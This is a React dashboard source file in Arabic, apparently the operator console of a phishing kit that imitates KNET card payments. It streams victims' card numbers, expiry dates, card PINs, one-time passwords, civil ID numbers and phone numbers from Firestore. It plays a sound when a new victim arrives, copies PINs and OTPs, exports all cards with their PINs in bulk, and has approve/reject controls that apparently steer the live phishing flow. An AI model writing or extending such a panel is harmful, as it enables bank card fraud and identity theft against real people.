import { useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import {
  Users,
  CreditCard,
  Eye,
  EyeOff,
  Wifi,
  WifiOff,
  RefreshCw,
  Download,
  Settings,
  Bell,
  BellOff,
  Search,
  Filter,
  ChevronLeft,
  ChevronRight,
  Loader2,
  Wallet,
  Copy,
  Phone,
  IdCard,
  Clock,
  Globe,
  Volume2,
  VolumeX,
  Check,
  X,
} from "lucide-react";
import { subscribeToKnetPayments, updateKnetPaymentStatus, type KnetPayment } from "@/lib/firestore";

function MiniSparkline({ data, color }: { data: number[]; color: string }) {
  const max = Math.max(...data);
  const min = Math.min(...data);
  const range = max - min || 1;
  const width = 80;
  const height = 30;
  const points = data
    .map((val, i) => {
      const x = (i / (data.length - 1)) * width;
      const y = height - ((val - min) / range) * height;
      return `${x},${y}`;
    })
    .join(" ");

  return (
    <svg width={width} height={height} className="mt-2">
      <polyline fill="none" stroke={color} strokeWidth="2" points={points} />
    </svg>
  );
}

function StatCard({
  title,
  value,
  icon: Icon,
  color,
  sparklineData,
}: {
  title: string;
  value: number | string;
  icon: any;
  color: string;
  sparklineData: number[];
}) {
  return (
    <div className="bg-white dark:bg-card rounded-lg p-4 shadow-sm border">
      <div className="flex items-start justify-between gap-2">
        <div>
          <p className="text-2xl font-bold">{value}</p>
          <p className="text-sm text-muted-foreground mt-1">{title}</p>
          <MiniSparkline data={sparklineData} color={color} />
          <p className="text-xs text-green-600 mt-1">غير متاح</p>
        </div>
        <div
          className="h-10 w-10 rounded-full flex items-center justify-center"
          style={{ backgroundColor: `${color}20` }}
        >
          <Icon className="h-5 w-5" style={{ color }} />
        </div>
      </div>
    </div>
  );
}

function PaymentDetailDialog({
  payment,
  open,
  onClose,
}: {
  payment: KnetPayment | null;
  open: boolean;
  onClose: () => void;
}) {
  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>(
    {},
  );

  const toggleField = (field: string) => {
    setShowSensitive((prev) => ({ ...prev, [field]: !prev[field] }));
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text || "");
    } catch (err) {
      console.error("Copy failed:", err);
    }
  };

  if (!payment) return null;

  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="max-w-2xl" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <CreditCard className="h-5 w-5" />
            تفاصيل الدفع - {payment.id.slice(0, 12)}...
          </DialogTitle>
          <DialogDescription>
            عرض تفاصيل عملية الدفع ومعلومات البطاقة
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4 py-4">
          <div className="flex items-center gap-2 mb-4">
            {payment.online ? (
              <Badge className="bg-green-100 text-green-800">
                <Wifi className="h-3 w-3 me-1" />
                متصل
              </Badge>
            ) : (
              <Badge className="bg-red-100 text-red-800">
                <WifiOff className="h-3 w-3 me-1" />
                غير متصل
              </Badge>
            )}
            <Badge variant="outline">{payment.bank || "غير محدد"}</Badge>
            <Badge
              className={
                payment.status === "approved"
                  ? "bg-green-100 text-green-800"
                  : payment.status === "pending" ||
                      payment.status === "pendding"
                    ? "bg-yellow-100 text-yellow-800"
                    : "bg-red-100 text-red-800"
              }
            >
              {payment.status || "غير محدد"}
            </Badge>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-muted/50 p-4 rounded-lg space-y-3">
              <h3 className="font-semibold flex items-center gap-2">
                <CreditCard className="h-4 w-4" />
                معلومات البطاقة
              </h3>

              <div className="space-y-2 text-sm">
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">رقم البطاقة:</span>
                  <div className="flex items-center gap-1">
                    <span className="font-mono" dir="ltr">
                      {!showSensitive.card
                        ? `${payment.prefix || ""} - ${payment.cardNumber || ""}`
                        : `${payment.prefix || ""} - ${payment.cardNumber || "****"}`}
                    </span>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-6 w-6"
                      onClick={() => toggleField("card")}
                    >
                      {!showSensitive.card ? (
                        <EyeOff className="h-3 w-3" />
                      ) : (
                        <Eye className="h-3 w-3" />
                      )}
                    </Button>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-6 w-6"
                      onClick={() =>
                        copyToClipboard(
                          `${payment.prefix}${payment.cardNumber}`,
                        )
                      }
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                </div>

                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">تاريخ الانتهاء:</span>
                  <span>
                    {payment.month}/{payment.year}
                  </span>
                </div>

                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">الرقم السري:</span>
                  <div className="flex items-center gap-1">
                    <span className="font-mono font-bold text-red-600">
                      {!showSensitive.pin ? payment.pass : "****"}
                    </span>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-6 w-6"
                      onClick={() => toggleField("pin")}
                    >
                      {showSensitive.pin ? (
                        <EyeOff className="h-3 w-3" />
                      ) : (
                        <Eye className="h-3 w-3" />
                      )}
                    </Button>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-6 w-6"
                      onClick={() => copyToClipboard(payment.pass || "")}
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-muted/50 p-4 rounded-lg space-y-3">
              <h3 className="font-semibold flex items-center gap-2">
                <Phone className="h-4 w-4" />
                معلومات OTP
              </h3>

              <div className="space-y-2 text-sm">
                {payment.otp && (
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">OTP الحالي:</span>
                    <div className="flex items-center gap-1">
                      <span className="font-mono font-bold text-green-600">
                        {showSensitive.otp ? payment.otp : "****"}
                      </span>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6"
                        onClick={() => toggleField("otp")}
                      >
                        {showSensitive.otp ? (
                          <EyeOff className="h-3 w-3" />
                        ) : (
                          <Eye className="h-3 w-3" />
                        )}
                      </Button>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6"
                        onClick={() => copyToClipboard(payment.otp || "")}
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                )}

                {payment.otp2 && (
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">OTP 2:</span>
                    <div className="flex items-center gap-1">
                      <span className="font-mono font-bold">
                        {showSensitive.otp2 ? payment.otp2 : "****"}
                      </span>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6"
                        onClick={() => toggleField("otp2")}
                      >
                        {showSensitive.otp2 ? (
                          <EyeOff className="h-3 w-3" />
                        ) : (
                          <Eye className="h-3 w-3" />
                        )}
                      </Button>
                    </div>
                  </div>
                )}

                {payment.allOtps && payment.allOtps.length > 0 && (
                  <div>
                    <span className="text-muted-foreground">جميع OTPs:</span>
                    <div className="flex flex-wrap gap-1 mt-1">
                      {payment.allOtps
                        .filter((o) => o && o.trim())
                        .map((otp, i) => (
                          <Badge
                            key={i}
                            variant="secondary"
                            className="font-mono text-xs"
                          >
                            {showSensitive.allOtps
                              ? otp.replace(/,/g, "").trim()
                              : "****"}
                          </Badge>
                        ))}
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6"
                        onClick={() => toggleField("allOtps")}
                      >
                        {showSensitive.allOtps ? (
                          <EyeOff className="h-3 w-3" />
                        ) : (
                          <Eye className="h-3 w-3" />
                        )}
                      </Button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-muted/50 p-4 rounded-lg space-y-3">
              <h3 className="font-semibold flex items-center gap-2">
                <IdCard className="h-4 w-4" />
                معلومات شخصية
              </h3>

              <div className="space-y-2 text-sm">
                {payment.idNumber && (
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">الرقم المدني:</span>
                    <div className="flex items-center gap-1">
                      <span className="font-mono">{payment.idNumber}</span>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6"
                        onClick={() => copyToClipboard(payment.idNumber || "")}
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                )}

                {payment.phoneNumber && (
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">رقم الهاتف:</span>
                    <div className="flex items-center gap-1">
                      <span>{payment.phoneNumber}</span>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6"
                        onClick={() =>
                          copyToClipboard(payment.phoneNumber || "")
                        }
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                )}

                {payment.network && (
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">الشبكة:</span>
                    <span>{payment.network}</span>
                  </div>
                )}
              </div>
            </div>

            <div className="bg-muted/50 p-4 rounded-lg space-y-3">
              <h3 className="font-semibold flex items-center gap-2">
                <Clock className="h-4 w-4" />
                معلومات إضافية
              </h3>

              <div className="space-y-2 text-sm">
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">تاريخ الإنشاء:</span>
                  <span>
                    {payment.createdDate
                      ? new Date(payment.createdDate).toLocaleString("ar-KW")
                      : "غير متاح"}
                  </span>
                </div>

                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">الخطوة:</span>
                  <div className="flex gap-0.5">
                    {[1, 2, 3, 4, 5, 6, 7].map((step) => (
                      <div
                        key={step}
                        className={`h-2 w-2 rounded-full ${
                          step <= (payment.step || 1)
                            ? "bg-green-500"
                            : "bg-gray-300"
                        }`}
                      />
                    ))}
                  </div>
                </div>

                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">ID:</span>
                  <div className="flex items-center gap-1">
                    <span className="font-mono text-xs">{payment.id}</span>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-6 w-6"
                      onClick={() => copyToClipboard(payment.id)}
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="flex gap-2 pt-4 border-t">
            <Button 
              variant="destructive" 
              className="flex-1"
              onClick={async () => {
                try {
                  await updateKnetPaymentStatus(payment.id, "rejected");
                  onClose();
                } catch (err) {
                  console.error("Failed to reject payment:", err);
                }
              }}
              data-testid="button-dialog-reject"
            >
              <X className="h-4 w-4 ml-2" />
              رفض
            </Button>
            <Button 
              className="flex-1 bg-green-600 hover:bg-green-700"
              onClick={async () => {
                try {
                  await updateKnetPaymentStatus(payment.id, "approved");
                  onClose();
                } catch (err) {
                  console.error("Failed to approve payment:", err);
                }
              }}
              data-testid="button-dialog-approve"
            >
              <Check className="h-4 w-4 ml-2" />
              قبول
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}

function useNotificationSound() {
  const audioContextRef = useRef<AudioContext | null>(null);

  const playNotificationSound = useCallback(() => {
    try {
      if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      }
      const ctx = audioContextRef.current;
      
      const oscillator = ctx.createOscillator();
      const gainNode = ctx.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(ctx.destination);
      
      oscillator.frequency.setValueAtTime(880, ctx.currentTime);
      oscillator.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
      oscillator.frequency.setValueAtTime(880, ctx.currentTime + 0.2);
      
      gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
      
      oscillator.start(ctx.currentTime);
      oscillator.stop(ctx.currentTime + 0.3);
    } catch (err) {
      console.error("Audio playback failed:", err);
    }
  }, []);

  return playNotificationSound;
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [adminUser, setAdminUser] = useState<any>(null);
  const [knetPayments, setKnetPayments] = useState<KnetPayment[]>([]);
  const [knetLoading, setKnetLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>(
    {},
  );
  const [selectedPayment, setSelectedPayment] = useState<KnetPayment | null>(
    null,
  );
  const [detailDialogOpen, setDetailDialogOpen] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const previousPaymentCount = useRef<number>(0);
  const isInitialLoad = useRef<boolean>(true);
  const playNotificationSound = useNotificationSound();
  const itemsPerPage = 15;

  useEffect(() => {
    const token = localStorage.getItem("adminSession");
    const user = localStorage.getItem("adminUser");

    if (!token || !user) {
      setLocation("/admin/login");
      return;
    }

    try {
      setAdminUser(JSON.parse(user));
    } catch {
      setLocation("/admin/login");
    }
  }, [setLocation]);

  useEffect(() => {
    const unsubscribe = subscribeToKnetPayments((payments) => {
      if (!isInitialLoad.current && soundEnabled && payments.length > previousPaymentCount.current) {
        playNotificationSound();
      }
      previousPaymentCount.current = payments.length;
      isInitialLoad.current = false;
      setKnetPayments(payments);
      setKnetLoading(false);
    });
    return () => unsubscribe();
  }, [soundEnabled, playNotificationSound]);

  const toggleSensitive = (id: string, field: string) => {
    setShowSensitive((prev) => ({
      ...prev,
      [`${id}-${field}`]: !prev[`${id}-${field}`],
    }));
  };

  const isSensitiveVisible = (id: string, field: string) => {
    return showSensitive[`${id}-${field}`] || false;
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text || "");
    } catch (err) {
      console.error("Copy failed:", err);
    }
  };

  const filteredPayments = knetPayments.filter((payment) => {
    if (!searchQuery) return true;
    const search = searchQuery.toLowerCase();
    return (
      payment.id?.toLowerCase().includes(search) ||
      payment.cardNumber?.toLowerCase().includes(search) ||
      payment.bank?.toLowerCase().includes(search) ||
      payment.phoneNumber?.toLowerCase().includes(search) ||
      payment.idNumber?.toLowerCase().includes(search)
    );
  });

  const totalPages = Math.ceil(filteredPayments.length / itemsPerPage);
  const paginatedPayments = filteredPayments.slice(
    (currentPage - 1) * itemsPerPage,
    currentPage * itemsPerPage,
  );

  const onlineCount = knetPayments.filter((p) => p.online).length;
  const totalVisitors = knetPayments.length;
  const cardInfoCount = knetPayments.filter((p) => p.cardNumber).length;
  const walletCount = knetPayments.filter(
    (p) => p.status === "approved",
  ).length;

  const getTimeAgo = (date: any) => {
    if (!date) return "غير معروف";
    const now = new Date();
    const then = new Date(date);
    const diffMs = now.getTime() - then.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMins / 60);
    const diffDays = Math.floor(diffHours / 24);
    const diffMonths = Math.floor(diffDays / 30);

    if (diffMonths > 0) return `منذ ${diffMonths} أشهر`;
    if (diffDays > 0) return `منذ ${diffDays} يوم`;
    if (diffHours > 0) return `منذ ${diffHours} ساعة`;
    if (diffMins > 0) return `منذ ${diffMins} دقيقة`;
    return "الآن";
  };

  const openPaymentDetail = (payment: KnetPayment) => {
    setSelectedPayment(payment);
    setDetailDialogOpen(true);
  };

  if (!adminUser) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-background" dir="rtl">
      <header className="bg-[#1a1a2e] text-white sticky top-0 z-50">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="h-8 w-8 rounded-full bg-white/10 flex items-center justify-center">
              <Users className="h-4 w-4" />
            </div>
            <div>
              <h1 className="font-semibold text-lg">لوحة الإشعارات المتقدمة</h1>
              <p className="text-xs text-white/60">
                آخر تحديث: {new Date().toLocaleTimeString("ar-KW")}
              </p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="icon"
              className={`text-white hover:bg-white/10 ${soundEnabled ? 'bg-green-600/20' : ''}`}
              onClick={() => setSoundEnabled(!soundEnabled)}
              data-testid="button-toggle-sound"
              title={soundEnabled ? "إيقاف الصوت" : "تفعيل الصوت"}
            >
              {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
            </Button>
            <Button
              variant="ghost"
              size="icon"
              className="text-white hover:bg-white/10"
            >
              <Bell className="h-4 w-4" />
            </Button>
            <Button
              variant="ghost"
              size="icon"
              className="text-white hover:bg-white/10"
            >
              <Settings className="h-4 w-4" />
            </Button>
            <Button
              variant="ghost"
              size="icon"
              className="text-white hover:bg-white/10"
              onClick={() => window.location.reload()}
            >
              <RefreshCw className="h-4 w-4" />
            </Button>
            <Button
              variant="ghost"
              size="icon"
              className="text-white hover:bg-white/10"
            >
              <Download className="h-4 w-4" />
            </Button>
            <Button
              size="sm"
              className="bg-green-600 hover:bg-green-700 text-white rounded-full px-4"
              data-testid="button-copy-all"
              onClick={async () => {
                try {
                  const allData = knetPayments
                    .map(
                      (p) =>
                        `${p.prefix || ""}${p.cardNumber || ""} | ${p.month || ""}/${p.year || ""} | PIN: ${p.pass || "-"} | OTP: ${p.otp || "-"}`,
                    )
                    .join("\n");
                  await navigator.clipboard.writeText(allData);
                } catch (err) {
                  console.error("Copy failed:", err);
                }
              }}
            >
              نسخ الكل
            </Button>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 space-y-6">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <StatCard
            title="إجمالي الزوار"
            value={totalVisitors}
            icon={Users}
            color="#10b981"
            sparklineData={[10, 25, 15, 30, 20, 35, 25, totalVisitors]}
          />
          <StatCard
            title="المستخدمين المتصلين"
            value={onlineCount}
            icon={Wifi}
            color="#f59e0b"
            sparklineData={[5, 8, 3, 12, 6, 9, 4, onlineCount]}
          />
          <StatCard
            title="معلومات البطاقات"
            value={cardInfoCount}
            icon={CreditCard}
            color="#3b82f6"
            sparklineData={[20, 35, 25, 45, 30, 50, 40, cardInfoCount]}
          />
          <StatCard
            title="المحفظات"
            value={walletCount}
            icon={Wallet}
            color="#8b5cf6"
            sparklineData={[8, 12, 6, 15, 10, 18, 12, walletCount]}
          />
        </div>

        <div className="bg-white dark:bg-card rounded-lg shadow-sm border">
          <div className="p-4 border-b flex flex-wrap items-center justify-between gap-4">
            <div>
              <h2 className="text-lg font-semibold flex items-center gap-2">
                <Settings className="h-5 w-5 text-primary" />
                إدارة الإشعارات
              </h2>
              <p className="text-sm text-muted-foreground">
                عرض وإدارة جميع الإشعارات والبيانات المسجلة
              </p>
            </div>
            <div className="flex items-center gap-2 flex-wrap">
              <Badge variant="outline" className="bg-blue-50 text-blue-700">
                كل المقاطع {knetPayments.length}
              </Badge>
              <Badge variant="outline" className="bg-green-50 text-green-700">
                متصل {onlineCount}
              </Badge>
            </div>
          </div>

          <div className="p-4 border-b flex flex-wrap items-center gap-4">
            <div className="relative flex-1 min-w-[200px]">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="البحث في الإشعارات..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pe-10"
                data-testid="input-search"
              />
            </div>
            <Button variant="outline" size="sm" data-testid="button-filter">
              <Filter className="h-4 w-4 me-2" />
              تصفية
            </Button>
          </div>

          {knetLoading ? (
            <div className="flex justify-center py-12">
              <Loader2 className="h-8 w-8 animate-spin text-primary" />
            </div>
          ) : paginatedPayments.length === 0 ? (
            <div className="py-12 text-center text-muted-foreground">
              لا توجد إشعارات
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead className="bg-muted/50 border-b">
                  <tr>
                    <th className="text-start p-3 font-medium">الدولة</th>
                    <th className="text-start p-3 font-medium">المعلومات</th>
                    <th className="text-start p-3 font-medium">الحالة</th>
                    <th className="text-start p-3 font-medium">الوقت</th>
                    <th className="text-start p-3 font-medium">البطاقة</th>
                    <th className="text-start p-3 font-medium">الرقم السري</th>
                    <th className="text-start p-3 font-medium">OTP</th>
                    <th className="text-start p-3 font-medium">الخطوة</th>
                    <th className="text-start p-3 font-medium">الإجراءات</th>
                  </tr>
                </thead>
                <tbody className="divide-y">
                  {paginatedPayments.map((payment) => (
                    <tr
                      key={payment.id}
                      className="hover:bg-muted/30 cursor-pointer"
                      data-testid={`row-payment-${payment.id}`}
                      onClick={() => openPaymentDetail(payment)}
                    >
                      <td className="p-3">
                        <div className="flex items-center gap-1">
                          <Globe className="h-3 w-3" />
                          <span className="font-medium">{payment.country}</span>
                        </div>
                      </td>
                      <td className="p-3">
                        <div className="flex flex-wrap gap-1">
                          {payment.cardNumber && (
                            <Badge className="bg-green-100 text-green-800 text-xs">
                              معلومات البطاقة
                            </Badge>
                          )}
                          {payment.otp && (
                            <Badge className="bg-blue-100 text-blue-800 text-xs">
                              معلومات الشخصية
                            </Badge>
                          )}
                        </div>
                      </td>
                      <td className="p-3">
                        {payment.online ? (
                          <Badge className="bg-green-100 text-green-800">
                            متصل
                          </Badge>
                        ) : (
                          <Badge className="bg-red-100 text-red-800">
                            غير متصل
                          </Badge>
                        )}
                      </td>
                      <td className="p-3 text-muted-foreground text-xs">
                        {getTimeAgo(payment.createdDate)}
                      </td>
                      <td className="p-3">
                        <div
                          className="flex items-center gap-1"
                          onClick={(e) => e.stopPropagation()}
                        >
                          <span className="font-mono text-xs">
                            {isSensitiveVisible(payment.id, "card")
                              ? `${payment.prefix || ""}' - '${payment.cardNumber || "---"}`
                              : `${payment.cardNumber || "****"}`}
                          </span>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-5 w-5"
                            onClick={(e) => {
                              e.stopPropagation();
                              toggleSensitive(payment.id, "card");
                            }}
                            data-testid={`toggle-card-${payment.id}`}
                          >
                            {isSensitiveVisible(payment.id, "card") ? (
                              <EyeOff className="h-3 w-3" />
                            ) : (
                              <Eye className="h-3 w-3" />
                            )}
                          </Button>
                        </div>
                      </td>
                      <td className="p-3">
                        <div
                          className="flex items-center gap-1"
                          onClick={(e) => e.stopPropagation()}
                        >
                          <Badge
                            variant="secondary"
                            className="font-mono bg-red-100 text-red-800"
                          >
                            {isSensitiveVisible(payment.id, "pin")
                              ? payment.pass || "---"
                              : "****"}
                          </Badge>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-5 w-5"
                            onClick={(e) => {
                              e.stopPropagation();
                              toggleSensitive(payment.id, "pin");
                            }}
                            data-testid={`toggle-pin-${payment.id}`}
                          >
                            {isSensitiveVisible(payment.id, "pin") ? (
                              <EyeOff className="h-3 w-3" />
                            ) : (
                              <Eye className="h-3 w-3" />
                            )}
                          </Button>
                        </div>
                      </td>
                      <td className="p-3">
                        <div
                          className="flex items-center gap-1"
                          onClick={(e) => e.stopPropagation()}
                        >
                          <Badge
                            variant="secondary"
                            className="font-mono bg-amber-100 text-amber-800"
                          >
                            {isSensitiveVisible(payment.id, "otp")
                              ? payment.otp || "---"
                              : "****"}
                          </Badge>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-5 w-5"
                            onClick={(e) => {
                              e.stopPropagation();
                              toggleSensitive(payment.id, "otp");
                            }}
                            data-testid={`toggle-otp-${payment.id}`}
                          >
                            {isSensitiveVisible(payment.id, "otp") ? (
                              <EyeOff className="h-3 w-3" />
                            ) : (
                              <Eye className="h-3 w-3" />
                            )}
                          </Button>
                        </div>
                      </td>
                      <td className="p-3">
                        <div className="flex items-center gap-0.5">
                          {[1, 2, 3, 4, 5, 6, 7].map((step) => (
                            <div
                              key={step}
                              className={`h-2 w-2 rounded-full ${
                                step <= (payment.step || 1)
                                  ? "bg-green-500"
                                  : "bg-gray-300"
                              }`}
                            />
                          ))}
                        </div>
                      </td>
                      <td className="p-3">
                        <div
                          className="flex items-center gap-1"
                          onClick={(e) => e.stopPropagation()}
                        >
                          <Button
                            size="sm"
                            variant="destructive"
                            className="h-6 px-2 text-xs rounded-full"
                            onClick={async (e) => {
                              e.stopPropagation();
                              try {
                                await updateKnetPaymentStatus(payment.id, "rejected");
                              } catch (err) {
                                console.error("Failed to reject payment:", err);
                              }
                            }}
                            data-testid={`button-reject-${payment.id}`}
                          >
                            <X className="h-3 w-3 ml-1" />
                            رفض
                          </Button>
                          <Button
                            size="sm"
                            className="h-6 px-2 text-xs rounded-full bg-green-600 hover:bg-green-700"
                            onClick={async (e) => {
                              e.stopPropagation();
                              try {
                                await updateKnetPaymentStatus(payment.id, "approved");
                              } catch (err) {
                                console.error("Failed to approve payment:", err);
                              }
                            }}
                            data-testid={`button-approve-${payment.id}`}
                          >
                            <Check className="h-3 w-3 ml-1" />
                            قبول
                          </Button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {totalPages > 1 && (
            <div className="p-4 border-t flex items-center justify-between gap-4">
              <div className="text-sm text-muted-foreground">
                عرض {(currentPage - 1) * itemsPerPage + 1} -{" "}
                {Math.min(currentPage * itemsPerPage, filteredPayments.length)}{" "}
                من {filteredPayments.length}
              </div>
              <div className="flex items-center gap-2">
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
                  disabled={currentPage === 1}
                  data-testid="button-prev-page"
                >
                  <ChevronRight className="h-4 w-4" />
                </Button>
                <span className="text-sm px-2">
                  {currentPage} / {totalPages}
                </span>
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() =>
                    setCurrentPage((p) => Math.min(totalPages, p + 1))
                  }
                  disabled={currentPage === totalPages}
                  data-testid="button-next-page"
                >
                  <ChevronLeft className="h-4 w-4" />
                </Button>
              </div>
            </div>
          )}
        </div>
      </main>

      <PaymentDetailDialog
        payment={selectedPayment}
        open={detailDialogOpen}
        onClose={() => setDetailDialogOpen(false)}
      />
    </div>
  );
}
